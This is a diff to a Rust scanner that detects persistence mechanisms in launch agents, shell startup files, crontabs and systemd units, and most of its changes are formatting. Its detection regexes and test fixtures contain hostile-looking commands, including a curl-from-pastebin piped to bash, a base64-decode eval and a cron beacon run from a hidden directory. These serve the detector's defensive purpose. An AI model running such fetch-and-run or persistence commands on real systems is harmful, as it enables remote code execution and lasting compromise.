@@ -48,8 +48,8 @@ use std::sync::OnceLock;
 
 use regex::Regex;
 
-use crate::engine::{DetectionEngine, FileUnit, ScanContext};
 use crate::engine::scan_window;
+use crate::engine::{DetectionEngine, FileUnit, ScanContext};
 use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};
 
 /// Engine name stamped into every finding and reported in [`EngineStat`].
@@ -73,10 +73,7 @@ struct RuleBudget {
 impl RuleBudget {
     /// Record an emission; `false` once this rule has hit the cap for the file.
     fn allow(&mut self, rule: &'static str) -> bool {
-        let slot = self
-            .counts
-            .iter_mut()
-            .find(|(name, _)| *name == rule);
+        let slot = self.counts.iter_mut().find(|(name, _)| *name == rule);
         match slot {
             Some((_, count)) if *count >= MAX_FINDINGS_PER_RULE => false,
             Some((_, count)) => {
@@ -141,22 +138,22 @@ impl Patterns {
                 .expect("invariant: plist RunAtLoad regex"),
 
             download_exec: Regex::new(
-                r"(?ix)
+                r#"(?ix)
                 (?: \b(?:curl|wget)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:[\w/.-]*/)?(?:ba|da|z|fi|k)?sh\b
                   | \b(?:ba|z|fi|k)?sh\b\s*<\(\s*(?:curl|wget)\b
                   | \bpython[23]?\b\s*<\(\s*(?:curl|wget)\b
                   | \b(?:curl|wget)\b[^|\n]{0,200}\|\s*(?:sudo\s+)?\bpython[23]?\b
-                )",
+                )"#,
             )
             .expect("invariant: download-exec regex"),
 
             decode_exec: Regex::new(
-                r"(?ix)
+                r#"(?ix)
                 (?: \bb(?:ase)?(?:32|64)\b\s*(?:-d|--decode|-D)\b[^|\n]{0,120}\|\s*(?:[\w/.-]*/)?(?:ba|z|fi|k)?sh\b
                   | \beval\s+[\"']?\$\(\s*(?:echo|printf)\b[^)]{0,200}\|\s*(?:[\w/.-]*/)?b(?:ase)?(?:32|64)\b\s*(?:-d|--decode|-D)\b
                   | \bxxd\s+-r\s+-p\b[^|\n]{0,120}\|\s*(?:[\w/.-]*/)?(?:ba|z|fi|k)?sh\b
                   | \beval\s+[\"']?\$\(\s*(?:echo|printf)\b[^\n]{0,200}\\x[0-9a-f]{2}
-                )",
+                )"#,
             )
             .expect("invariant: decode-exec regex"),
 
@@ -323,27 +320,33 @@ fn is_suspicious_exec_path(path: &str) -> bool {
         .split('/')
         .enumerate()
         .skip(3)
-        .filter(|(_, component)| {
-            !component.is_empty() && *component != "." && *component != ".."
-        })
-        .any(|(_, component)| {
-            component.starts_with('.') && !BENIGN_DOT_DIRS.contains(&component)
-        })
+        .filter(|(_, component)| !component.is_empty() && *component != "." && *component != "..")
+        .any(|(_, component)| component.starts_with('.') && !BENIGN_DOT_DIRS.contains(&component))
 }
 
 /// The first whitespace-delimited token of `line` that looks like a path.
 fn first_path_token(line: &str) -> Option<&str> {
     line.split_whitespace()
         .map(|token| token.trim_matches(|c| c == '"' || c == '\''))
-        .find(|token| {
-            token.starts_with('/') || token.starts_with("./") || token.starts_with("~/")
-        })
+        .find(|token| token.starts_with('/') || token.starts_with("./") || token.starts_with("~/"))
 }
 
 /// Interpreters that can run a script handed to them inline with `-c` / `-e`.
 const INLINE_INTERPRETERS: &[&str] = &[
-    "sh", "bash", "zsh", "dash", "fish", "ksh", "python", "python2", "python3", "perl", "ruby",
-    "node", "osascript", "php",
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "fish",
+    "ksh",
+    "python",
+    "python2",
+    "python3",
+    "perl",
+    "ruby",
+    "node",
+    "osascript",
+    "php",
 ];
 
 /// `true` when `executable` is an interpreter invoked with an inline script
@@ -399,10 +402,18 @@ impl DetectionEngine for PersistenceEngine {
             let mut budget = RuleBudget::default();
 
             match kind {
-                TargetKind::LaunchAgent => scan_launch_agent(file, &text, patterns, &mut budget, &mut findings),
-                TargetKind::ShellStartup => scan_shell_startup(file, &text, patterns, &mut budget, &mut findings),
-                TargetKind::Crontab => scan_crontab(file, &text, patterns, &mut budget, &mut findings),
-                TargetKind::SystemdUnit => scan_systemd_unit(file, &text, patterns, &mut budget, &mut findings),
+                TargetKind::LaunchAgent => {
+                    scan_launch_agent(file, &text, patterns, &mut budget, &mut findings)
+                }
+                TargetKind::ShellStartup => {
+                    scan_shell_startup(file, &text, patterns, &mut budget, &mut findings)
+                }
+                TargetKind::Crontab => {
+                    scan_crontab(file, &text, patterns, &mut budget, &mut findings)
+                }
+                TargetKind::SystemdUnit => {
+                    scan_systemd_unit(file, &text, patterns, &mut budget, &mut findings)
+                }
             }
         }
 
@@ -698,7 +709,10 @@ fn scan_crontab(
         if command.is_empty() {
             continue;
         }
-        let reboot = trimmed.trim_start().to_ascii_lowercase().starts_with("@reboot");
+        let reboot = trimmed
+            .trim_start()
+            .to_ascii_lowercase()
+            .starts_with("@reboot");
 
         if patterns.download_exec.is_match(command) && budget.allow("PERSIST_CRON_DOWNLOAD_EXEC") {
             findings.push(finding(
@@ -895,8 +909,9 @@ mod tests {
 </dict></plist>"#;
         let findings = scan("Library/LaunchAgents/com.apple.updater.helper.plist", plist);
         assert!(
-            findings.iter().any(|f| f.rule_id.as_deref()
-                == Some("PERSIST_LAUNCHD_TEMP_EXEC_RUNATLOAD")),
+            findings
+                .iter()
+                .any(|f| f.rule_id.as_deref() == Some("PERSIST_LAUNCHD_TEMP_EXEC_RUNATLOAD")),
             "a RunAtLoad agent running out of /tmp/.hidden must be critical: {findings:?}"
         );
     }
@@ -915,20 +930,17 @@ mod tests {
 </dict></plist>"#;
         let findings = scan("Library/LaunchAgents/com.example.sync.plist", plist);
         assert!(
-            findings
-                .iter()
-                .any(|f| f.rule_id.as_deref() == Some("PERSIST_LAUNCHD_DOWNLOAD_EXEC")
-                    && f.severity == Severity::Critical),
+            findings.iter().any(
+                |f| f.rule_id.as_deref() == Some("PERSIST_LAUNCHD_DOWNLOAD_EXEC")
+                    && f.severity == Severity::Critical
+            ),
             "a curl|sh launch agent must be critical: {findings:?}"
         );
     }
 
     #[test]
     fn zshrc_with_base64_eval_is_flagged() {
-        let findings = scan(
-            ".zshrc",
-            &shell_rc("eval \"$(echo aG9zdA== | base64 -d)\""),
-        );
+        let findings = scan(".zshrc", &shell_rc("eval \"$(echo aG9zdA== | base64 -d)\""));
         assert!(
             findings
                 .iter()
@@ -944,9 +956,10 @@ mod tests {
             &shell_rc("curl -fsSL https://pastebin.com/raw/abc | bash"),
         );
         assert!(
-            findings.iter().any(|f| f.rule_id.as_deref()
-                == Some("PERSIST_SHELLRC_DOWNLOAD_EXEC")
-                && f.severity == Severity::Critical),
+            findings.iter().any(
+                |f| f.rule_id.as_deref() == Some("PERSIST_SHELLRC_DOWNLOAD_EXEC")
+                    && f.severity == Severity::Critical
+            ),
             "curl|bash in .bashrc must be critical: {findings:?}"
         );
     }
@@ -958,8 +971,9 @@ mod tests {
             &shell_rc("launchctl load ~/Library/LaunchAgents/com.foo.agent.plist"),
         );
         assert!(
-            findings.iter().any(|f| f.rule_id.as_deref()
-                == Some("PERSIST_SHELLRC_LAUNCHCTL_LOAD")),
+            findings
+                .iter()
+                .any(|f| f.rule_id.as_deref() == Some("PERSIST_SHELLRC_LAUNCHCTL_LOAD")),
             "launchctl load in a shell rc must be flagged: {findings:?}"
         );
     }
@@ -980,10 +994,7 @@ mod tests {
 
     #[test]
     fn frequent_cron_entry_from_hidden_dir_is_flagged() {
-        let findings = scan(
-            "crontab",
-            "*/5 * * * * /home/u/.cache/.svc/beacon --once\n",
-        );
+        let findings = scan("crontab", "*/5 * * * * /home/u/.cache/.svc/beacon --once\n");
         assert!(
             findings
                 .iter()
@@ -1066,7 +1077,10 @@ mod tests {
         let files = vec![
             unit("package.json", "{\"name\":\"x\"}"),
             unit("src/index.js", "curl('https://x')"),
-            unit("Library/Preferences/com.foo.plist", "<plist><dict><key>Program</key><string>/tmp/.x/b</string></dict></plist>"),
+            unit(
+                "Library/Preferences/com.foo.plist",
+                "<plist><dict><key>Program</key><string>/tmp/.x/b</string></dict></plist>",
+            ),
         ];
         let config = crate::config::ScanConfig::default();
         let ctx = ScanContext {
@@ -1111,8 +1125,14 @@ mod tests {
 
     #[test]
     fn classification_is_path_driven() {
-        assert_eq!(classify("Library/LaunchAgents/a.plist"), Some(TargetKind::LaunchAgent));
-        assert_eq!(classify("Library/LaunchDaemons/a.plist"), Some(TargetKind::LaunchAgent));
+        assert_eq!(
+            classify("Library/LaunchAgents/a.plist"),
+            Some(TargetKind::LaunchAgent)
+        );
+        assert_eq!(
+            classify("Library/LaunchDaemons/a.plist"),
+            Some(TargetKind::LaunchAgent)
+        );
         assert_eq!(classify("Library/LaunchAgents/a.txt"), None);
         assert_eq!(classify(".zshrc"), Some(TargetKind::ShellStartup));
         assert_eq!(classify("/home/u/.bashrc"), Some(TargetKind::ShellStartup));
